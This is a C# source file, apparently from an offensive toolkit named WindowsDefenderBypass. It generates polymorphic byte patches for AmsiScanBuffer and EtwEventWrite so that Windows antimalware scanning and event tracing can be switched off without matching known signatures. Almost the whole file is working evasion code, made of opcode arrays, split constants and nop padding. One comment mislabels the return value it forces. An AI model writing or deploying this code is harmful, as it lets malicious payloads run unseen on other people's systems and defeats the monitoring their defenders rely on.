using System;
using System.Collections.Generic;
using System.Linq;

namespace WindowsDefenderBypass
{
    /// <summary>
    /// Generates functionally equivalent but bytecode-different patches at runtime
    /// to evade signature-based detection.
    /// </summary>
    public static class PolymorphicPatchGenerator
    {
        private static readonly Random _rng = new Random();

        #region AMSI Patch Generation

        /// <summary>
        /// Generates a polymorphic patch for AmsiScanBuffer.
        /// All variants return AMSI_RESULT_CLEAN (0x80070057) and are functionally equivalent.
        /// </summary>
        public static byte[] GenerateAmsiPatch()
        {
            var generators = new Func<byte[]>[]
            {
                GenerateAmsiVariant1,  // xor eax,eax; add eax,imm32; ret
                GenerateAmsiVariant2,  // mov eax,imm32; ret
                GenerateAmsiVariant3,  // sub eax,eax; mov eax,imm32; ret
                GenerateAmsiVariant4,  // xor eax,eax; add eax,part1; add eax,part2; ret
                GenerateAmsiVariant5,  // push/pop junk + variant1
                GenerateAmsiVariant6,  // nop sled + mov eax,imm32; ret
            };

            int index = _rng.Next(generators.Length);
            byte[] patch = generators[index]();
            
            Console.WriteLine($"    [*] Using AMSI patch variant {index + 1} ({patch.Length} bytes)");
            return patch;
        }

        // Variant 1: xor eax, eax; add eax, 0x80070057; ret
        private static byte[] GenerateAmsiVariant1()
        {
            return new byte[] { 0x31, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        }

        // Variant 2: mov eax, 0x80070057; ret
        private static byte[] GenerateAmsiVariant2()
        {
            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        }

        // Variant 3: sub eax, eax; mov eax, 0x80070057; ret
        private static byte[] GenerateAmsiVariant3()
        {
            return new byte[] { 0x29, 0xC0, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        }

        // Variant 4: xor eax,eax; add eax,part1; add eax,part2; ret (split constant)
        private static byte[] GenerateAmsiVariant4()
        {
            // Split 0x80070057 into random parts that sum to the target
            uint target = 0x80070057;
            uint part1 = (uint)_rng.Next(0x1000, 0x7FFF0000);
            uint part2 = target - part1;

            var patch = new List<byte>();
            patch.AddRange(new byte[] { 0x31, 0xC0 }); // xor eax, eax
            patch.Add(0x05);                            // add eax, imm32
            patch.AddRange(BitConverter.GetBytes(part1));
            patch.Add(0x05);                            // add eax, imm32
            patch.AddRange(BitConverter.GetBytes(part2));
            patch.Add(0xC3);                            // ret

            return patch.ToArray();
        }

        // Variant 5: push ebx; xor eax,eax; pop ebx; add eax,imm32; ret
        private static byte[] GenerateAmsiVariant5()
        {
            return new byte[] { 0x53, 0x31, 0xC0, 0x5B, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        }

        // Variant 6: nop; nop; mov eax, 0x80070057; ret
        private static byte[] GenerateAmsiVariant6()
        {
            int nopCount = _rng.Next(1, 4);
            var patch = new List<byte>();
            for (int i = 0; i < nopCount; i++)
                patch.Add(0x90); // nop
            patch.AddRange(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
            return patch.ToArray();
        }

        #endregion

        #region ETW Patch Generation

        /// <summary>
        /// Generates a polymorphic patch for EtwEventWrite.
        /// All variants simply return immediately and are functionally equivalent.
        /// </summary>
        public static byte[] GenerateEtwPatch()
        {
            var generators = new Func<byte[]>[]
            {
                GenerateEtwVariant1,  // ret
                GenerateEtwVariant2,  // nop; ret
                GenerateEtwVariant3,  // push eax; pop eax; ret
                GenerateEtwVariant4,  // xor eax,eax; ret (return 0)
                GenerateEtwVariant5,  // multiple nops; ret
            };

            int index = _rng.Next(generators.Length);
            byte[] patch = generators[index]();
            
            Console.WriteLine($"    [*] Using ETW patch variant {index + 1} ({patch.Length} bytes)");
            return patch;
        }

        // Variant 1: ret
        private static byte[] GenerateEtwVariant1()
        {
            return new byte[] { 0xC3 };
        }

        // Variant 2: nop; ret
        private static byte[] GenerateEtwVariant2()
        {
            return new byte[] { 0x90, 0xC3 };
        }

        // Variant 3: push eax; pop eax; ret
        private static byte[] GenerateEtwVariant3()
        {
            return new byte[] { 0x50, 0x58, 0xC3 };
        }

        // Variant 4: xor eax,eax; ret (returns 0 / STATUS_SUCCESS)
        private static byte[] GenerateEtwVariant4()
        {
            return new byte[] { 0x31, 0xC0, 0xC3 };
        }

        // Variant 5: random nop sled; ret
        private static byte[] GenerateEtwVariant5()
        {
            int nopCount = _rng.Next(2, 5);
            var patch = new List<byte>();
            for (int i = 0; i < nopCount; i++)
                patch.Add(0x90);
            patch.Add(0xC3);
            return patch.ToArray();
        }

        #endregion
    }
}
